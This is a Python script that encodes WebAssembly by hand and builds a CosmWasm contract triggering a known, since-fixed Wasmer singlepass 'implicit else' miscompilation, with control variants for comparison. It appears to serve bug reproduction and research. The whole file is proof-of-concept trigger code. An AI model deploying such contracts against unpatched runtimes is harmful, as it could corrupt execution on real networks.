#!/usr/bin/env python3
"""
Minimal WebAssembly binary encoder + CosmWasm contract builder.

Used to produce the malicious contract for the Wasmer singlepass "implicit else"
miscompilation (GHSA-class bug fixed upstream in wasmerio/wasmer commit
e5ca9b93809d744af8b33488a748a284d3d41955, PR #7128).

The trigger shape is taken from the upstream regression test added by that same
commit (wasmerio/wasmer tests/compilers/issues.rs::implicit_else_reclaims_inputs):

    (type $pass (func (param i64) (result i64)))
    (func $probe)
    (func (export "check") (param $value i64) (param $condition i32) (param $expected i64)
        (result i32) (local $remaining i32)
        i32.const 400000 local.set $remaining
        loop
            <pushes>
            local.get $condition
            if (type $pass) <body> end          <-- implicit else (no `else` clause)
            <checks>
            <drops>
            call $probe
            local.get $remaining i32.const 1 i32.sub
            local.tee $remaining br_if 0
        end
        i32.const 1)
"""

import struct

# --------------------------------------------------------------------------
# primitive encoders
# --------------------------------------------------------------------------


def uleb(n: int) -> bytes:
    out = bytearray()
    while True:
        b = n & 0x7F
        n >>= 7
        if n:
            out.append(b | 0x80)
        else:
            out.append(b)
            return bytes(out)


def sleb(n: int) -> bytes:
    out = bytearray()
    while True:
        b = n & 0x7F
        n >>= 7
        if (n == 0 and not (b & 0x40)) or (n == -1 and (b & 0x40)):
            out.append(b)
            return bytes(out)
        out.append(b | 0x80)


def vec(items) -> bytes:
    out = bytearray(uleb(len(items)))
    for it in items:
        out += it
    return bytes(out)


def name(s: str) -> bytes:
    raw = s.encode()
    return uleb(len(raw)) + raw


# --------------------------------------------------------------------------
# opcode helpers
# --------------------------------------------------------------------------

I32, I64 = 0x7F, 0x7E
F32, F64 = 0x7D, 0x7C


def op_unreachable():
    return b"\x00"


def op_nop():
    return b"\x01"


def op_block(bt=0x40):
    return b"\x02" + (bytes([bt]) if bt == 0x40 else sleb(bt))


def op_loop(bt=0x40):
    return b"\x03" + (bytes([bt]) if bt == 0x40 else sleb(bt))


def op_if(bt=0x40):
    return b"\x04" + (bytes([bt]) if bt == 0x40 else sleb(bt))


def op_else():
    return b"\x05"


def op_end():
    return b"\x0b"


def op_br(depth):
    return b"\x0c" + uleb(depth)


def op_br_if(depth):
    return b"\x0d" + uleb(depth)


def op_call(idx):
    return b"\x10" + uleb(idx)


def op_drop():
    return b"\x1a"


def op_local_get(i):
    return b"\x20" + uleb(i)


def op_local_set(i):
    return b"\x21" + uleb(i)


def op_local_tee(i):
    return b"\x22" + uleb(i)


def op_global_get(i):
    return b"\x23" + uleb(i)


def op_global_set(i):
    return b"\x24" + uleb(i)


def op_i32_const(v):
    return b"\x41" + sleb(v)


def op_i64_const(v):
    return b"\x42" + sleb(v)


def op_f64_const(v):
    """f64.const with the raw 64-bit pattern (use struct.pack for floats)."""
    return b"\x44" + struct.pack("<d", v)


def op_f64_const_bits(bits):
    """f64.const from the raw 64-bit pattern (useful for NaN payloads)."""
    return b"\x44" + struct.pack("<Q", bits)


def op_f64_sqrt():
    return b"\x9f"


def op_f64_neg():
    return b"\x9a"


def op_f64_abs():
    return b"\x99"


def op_f64_add():
    return b"\xa0"


def op_f64_div():
    return b"\xa7"


def op_i64_reinterpret_f64():
    return b"\xbd"


def op_f64_reinterpret_i64():
    return b"\xbf"


def op_f32_sqrt():
    return b"\x91"


def op_f32_const_bits(bits):
    return b"\x43" + struct.pack("<I", bits)


def op_i32_reinterpret_f32():
    return b"\xbc"


def op_i32_eqz():
    return b"\x45"


def op_i32_ne():
    return b"\x47"


def op_i32_eq():
    return b"\x46"


def op_i64_ne():
    return b"\x52"


def op_i64_eq():
    return b"\x51"


def op_i32_rem_u():
    return b"\x70"


def op_i32_ge_u():
    return b"\x4f"


def op_i32_add():
    return b"\x6a"


def op_i32_store(offset=0, align=2):
    return b"\x36" + bytes([align]) + uleb(offset)


def op_i64_store(offset=0, align=3):
    return b"\x37" + bytes([align]) + uleb(offset)


def op_f64_store(offset=0, align=3):
    return b"\x39" + bytes([align]) + uleb(offset)


def op_i32_sub():
    return b"\x6b"


def op_i64_add():
    return b"\x7c"


# --------------------------------------------------------------------------
# module builder
# --------------------------------------------------------------------------


class Module:
    def __init__(self):
        self.types = []       # list[(params, results)]
        self.funcs = []       # list[(type_idx, locals, body)]
        self.exports = []     # list[(name, kind, index)]
        self.memories = []    # list[(min, max|None)]
        self.globals = []     # list[(valtype, mutable, init_expr)]
        self.data = []        # list[(offset, bytes)]
        self.imports = []     # list[(module, field, type_idx)]
        self._type_cache = {}

    # -- imports -----------------------------------------------------------
    def add_import(self, module, field, params, results):
        """Declares a function import; returns its index in the *function*
        index space (imported functions come first)."""
        tidx = self.add_type(params, results)
        idx = len(self.imports)
        self.imports.append((module, field, tidx))
        return idx

    # -- types ------------------------------------------------------------
    def add_type(self, params, results):
        key = (tuple(params), tuple(results))
        if key in self._type_cache:
            return self._type_cache[key]
        idx = len(self.types)
        self.types.append((list(params), list(results)))
        self._type_cache[key] = idx
        return idx

    # -- funcs ------------------------------------------------------------
    def add_func(self, params, results, locals=(), body=b"", export=None):
        tidx = self.add_type(params, results)
        fidx = len(self.imports) + len(self.funcs)
        self.funcs.append((tidx, list(locals), body))
        if export:
            self.exports.append((export, 0x00, fidx))
        return fidx

    def add_memory(self, minimum, maximum=None, export=None):
        midx = len(self.memories)
        self.memories.append((minimum, maximum))
        if export:
            self.exports.append((export, 0x02, midx))
        return midx

    def add_global(self, valtype, mutable, init):
        gidx = len(self.globals)
        self.globals.append((valtype, mutable, init))
        return gidx

    def add_data(self, offset, payload):
        self.data.append((offset, payload))

    # -- emit -------------------------------------------------------------
    @staticmethod
    def _section(out, sid, content):
        out += bytes([sid]) + uleb(len(content)) + content

    def build(self) -> bytes:
        out = bytearray(b"\x00asm\x01\x00\x00\x00")

        if self.types:
            entries = []
            for params, results in self.types:
                entries.append(
                    b"\x60"
                    + vec([bytes([p]) for p in params])
                    + vec([bytes([r]) for r in results])
                )
            self._section(out, 1, uleb(len(entries)) + b"".join(entries))

        if self.imports:
            entries = []
            for (mod, field, tidx) in self.imports:
                entries.append(name(mod) + name(field) + bytes([0x00]) + uleb(tidx))
            self._section(out, 2, uleb(len(entries)) + b"".join(entries))

        if self.funcs:
            entries = [uleb(t) for (t, _, _) in self.funcs]
            self._section(out, 3, uleb(len(entries)) + b"".join(entries))

        if self.memories:
            entries = []
            for mn, mx in self.memories:
                if mx is None:
                    entries.append(b"\x00" + uleb(mn))
                else:
                    entries.append(b"\x01" + uleb(mn) + uleb(mx))
            self._section(out, 5, uleb(len(entries)) + b"".join(entries))

        if self.globals:
            entries = []
            for vt, mut, init in self.globals:
                entries.append(bytes([vt, 1 if mut else 0]) + init + op_end())
            self._section(out, 6, uleb(len(entries)) + b"".join(entries))

        if self.exports:
            entries = []
            for nm, kind, idx in self.exports:
                entries.append(name(nm) + bytes([kind]) + uleb(idx))
            self._section(out, 7, uleb(len(entries)) + b"".join(entries))

        if self.funcs:
            entries = []
            for (_t, locals_, body) in self.funcs:
                # compress locals into (count, valtype) runs
                runs = []
                for lt in locals_:
                    if runs and runs[-1][1] == lt:
                        runs[-1][0] += 1
                    else:
                        runs.append([1, lt])
                loc = vec([uleb(c) + bytes([t]) for (c, t) in runs])
                code = loc + body + op_end()
                entries.append(uleb(len(code)) + code)
            self._section(out, 10, uleb(len(entries)) + b"".join(entries))

        if self.data:
            entries = []
            for off, payload in self.data:
                entries.append(
                    b"\x00" + op_i32_const(off) + op_end() + uleb(len(payload)) + payload
                )
            self._section(out, 11, uleb(len(entries)) + b"".join(entries))

        return bytes(out)


# --------------------------------------------------------------------------
# CosmWasm contract wrapper around the trigger
# --------------------------------------------------------------------------

# a minimal, valid ContractResult<Response> JSON
RESPONSE_JSON = b'{"ok":{"messages":[],"attributes":[],"events":[],"data":null}}'


def build_check_body(
    iterations: int,
    param_count: int,
    prefix_count: int,
    explicit_else: bool,
    use_params: bool,
    probe_idx: int,
    t_pass: int,
    report_counter: bool = False,
    body_kind: str = "empty",
) -> bytes:
    """Body of the `check` function, byte-for-byte the shape of the upstream
    regression test (wasmerio/wasmer @ e5ca9b938 tests/compilers/issues.rs).

        (func $check (param $value i64) (param $condition i32) (param $expected i64)
              (result i32) (local $remaining i32)
            i32.const N local.set $remaining
            loop
                <pushes>
                local.get $condition
                if (type $pass) <body> end
                <checks>
                <drops>
                call $probe
                local.get $remaining i32.const 1 i32.sub
                local.tee $remaining br_if 0
            end
            i32.const 1)

    report_counter=True returns the final loop counter instead of 1, so the
    caller can observe how many iterations were really executed.
    """
    b = bytearray()
    # locals: 0=$value(i64) 1=$condition(i32) 2=$expected(i64) 3=$remaining(i32)
    b += op_i32_const(iterations) + op_local_set(3)
    b += op_loop()

    # <pushes>
    for _ in range(prefix_count + (param_count if use_params else 0)):
        b += op_local_get(0)

    b += op_local_get(1)  # condition

    if use_params:
        b += op_if(t_pass)
        if explicit_else:
            b += op_else()
            b += op_drop() + op_i64_const(42)
        else:
            # the then-arm body (upstream regression-test variants)
            if body_kind == "replace":
                b += op_drop() + op_i64_const(42)
            elif body_kind == "branch":
                b += op_br(0)
            elif body_kind == "unreachable":
                b += op_unreachable()
            elif body_kind == "nested-unreachable":
                b += op_unreachable() + op_block() + op_i32_const(0) + op_if() + op_end() + op_end()
        b += op_end()
    else:
        b += op_if()
        b += op_nop()
        if explicit_else:
            b += op_else()
            b += op_nop()
        b += op_end()

    # <checks>
    for _ in range(param_count if use_params else 0):
        b += op_local_get(2) + op_i64_ne() + op_if() + op_unreachable() + op_end()

    # <drops>
    for _ in range(prefix_count):
        b += op_drop()

    b += op_call(probe_idx)

    b += (
        op_local_get(3) + op_i32_const(1) + op_i32_sub()
        + op_local_tee(3) + op_br_if(0)
    )
    b += op_end()  # end loop
    b += op_local_get(3) if report_counter else op_i32_const(1)
    return bytes(b)


def build_contract(
    iterations: int = 400000,
    param_count: int = 1,
    prefix_count: int = 4,
    explicit_else: bool = False,
    condition: int = 0,
    use_params: bool = True,
    expected: int = 0,
    shape: str = "upstream",
    report_counter: bool = False,
    body_kind: str = "empty",
) -> bytes:
    """Build a CosmWasm contract whose `execute` runs the trigger loop.

    use_params=True  -> `if` with a block type (multi-value) => the vulnerable
                         construct.  explicit_else=True adds the `else` clause
                         (control).  use_params=False -> `if` without block
                         parameters (control).

    shape="upstream" -> the loop lives in a separate `check` function with the
                       exact signature of the upstream regression test.
    shape="inline"   -> the loop is inlined into `execute`.
    """
    m = Module()
    m.add_memory(4, export="memory")

    t_void = m.add_type([], [])
    t_alloc = m.add_type([I32], [I32])
    t_free = m.add_type([I32], [])
    t_call3 = m.add_type([I32, I32, I32], [I32])
    t_pass = m.add_type([I64], [I64]) if use_params else None
    t_check = m.add_type([I64, I32, I64], [I32])

    # Static response region.
    # CosmWasm's memory ABI: the contract returns a pointer to a
    #   struct Region { u32 offset; u32 capacity; u32 length; }
    # followed by the payload at `offset`.
    RESP_PTR = 16       # the Region struct lives at address 16 (0 is null!)
    RESP_DATA = 64      # the payload lives at address 64
    n = len(RESPONSE_JSON)
    m.add_data(RESP_PTR, RESP_DATA.to_bytes(4, "little") + n.to_bytes(4, "little")
               + n.to_bytes(4, "little"))
    m.add_data(RESP_DATA, RESPONSE_JSON)

    # ---- globals: bump allocator pointers ------------------------------
    g_bump = m.add_global(I32, True, op_i32_const(1024))
    g_region = m.add_global(I32, True, op_i32_const(128))

    # ---- $probe: empty callee (exactly like the upstream regression test)
    probe_idx = m.add_func([], [], body=op_nop())

    # ---- $allocate / $deallocate ---------------------------------------
    # allocate(size) -> pointer to a Region describing a fresh buffer.
    # NOTE: in the Wasm stack machine the *address* is pushed first and the
    # *value* second (i32.store pops value then address).
    alloc_body = (
        op_global_get(g_region) + op_local_set(1)
        # region.offset = g_bump        -> mem[r] = g_bump
        + op_local_get(1) + op_global_get(g_bump) + op_i32_store()
        # region.capacity = size        -> mem[r+4] = size
        + op_local_get(1) + op_i32_const(4) + op_i32_add() + op_local_get(0) + op_i32_store()
        # region.length = 0             -> mem[r+8] = 0
        + op_local_get(1) + op_i32_const(8) + op_i32_add() + op_i32_const(0) + op_i32_store()
        # g_bump += size ; g_region += 12
        + op_global_get(g_bump) + op_local_get(0) + op_i32_add() + op_global_set(g_bump)
        + op_global_get(g_region) + op_i32_const(12) + op_i32_add() + op_global_set(g_region)
        # return the region pointer
        + op_local_get(1)
    )
    m.add_func([I32], [I32], locals=[I32], body=alloc_body, export="allocate")
    m.add_func([I32], [], body=op_nop(), export="deallocate")

    # ---- $instantiate ----------------------------------------------------
    m.add_func(
        [I32, I32, I32], [I32],
        body=op_i32_const(RESP_PTR),
        export="instantiate",
    )

    # ---- the trigger -----------------------------------------------------
    if shape == "upstream":
        check_body = build_check_body(
            iterations, param_count, prefix_count, explicit_else, use_params,
            probe_idx, t_pass, report_counter=report_counter, body_kind=body_kind,
        )
        check_idx = m.add_func([I64, I32, I64], [I32], locals=[I32], body=check_body)
        if report_counter:
            # Store the returned counter in the response payload and shrink the
            # response region to 4 bytes, so the host observes the counter.
            exec_body = (
                op_i64_const(123) + op_i32_const(condition) + op_i64_const(expected)
                + op_call(check_idx)
                + op_local_set(0)
                + op_i32_const(RESP_DATA) + op_local_get(0) + op_i32_store()
                + op_i32_const(RESP_PTR + 8) + op_i32_const(4) + op_i32_store()
                + op_i32_const(RESP_PTR)
            )
        else:
            exec_body = (
                op_i64_const(123) + op_i32_const(condition) + op_i64_const(expected)
                + op_call(check_idx) + op_drop() + op_i32_const(RESP_PTR)
            )
        m.add_func([I32, I32, I32], [I32], locals=[I32], body=exec_body, export="execute")
    else:
        # inline variant
        body = bytearray()
        body += op_i64_const(expected) + op_local_set(5)
        body += op_i32_const(iterations) + op_local_set(3)
        body += op_loop()
        for _ in range(prefix_count + (param_count if use_params else 0)):
            body += op_local_get(4)
        body += op_i32_const(condition)
        if use_params:
            body += op_if(t_pass)
            if explicit_else:
                body += op_else()
                body += op_drop() + op_i64_const(42)
            body += op_end()
        else:
            body += op_if()
            body += op_nop()
            if explicit_else:
                body += op_else()
                body += op_nop()
            body += op_end()
        for _ in range(param_count if use_params else 0):
            body += op_local_get(5) + op_i64_ne() + op_if() + op_unreachable() + op_end()
        for _ in range(prefix_count):
            body += op_drop()
        body += op_call(probe_idx)
        body += (
            op_local_get(3) + op_i32_const(1) + op_i32_sub()
            + op_local_tee(3) + op_br_if(0)
        )
        body += op_end()
        body += op_i32_const(RESP_PTR)
        m.add_func([I32, I32, I32], [I32], locals=[I32, I64, I64],
                   body=bytes(body), export="execute")

    # ---- interface marker ------------------------------------------------
    m.add_func([], [], body=op_nop(), export="interface_version_8")

    return m.build()


if __name__ == "__main__":
    import sys

    args = dict(a.split("=") for a in sys.argv[1:])
    wasm = build_contract(
        iterations=int(args.get("iterations", 400000)),
        param_count=int(args.get("params", 1)),
        prefix_count=int(args.get("prefix", 4)),
        explicit_else=args.get("else", "0") == "1",
        use_params=args.get("params", "1") != "0",
    )
    out = args.get("out", "/tmp/contract.wasm")
    with open(out, "wb") as fh:
        fh.write(wasm)
    print(f"wrote {out} ({len(wasm)} bytes)")
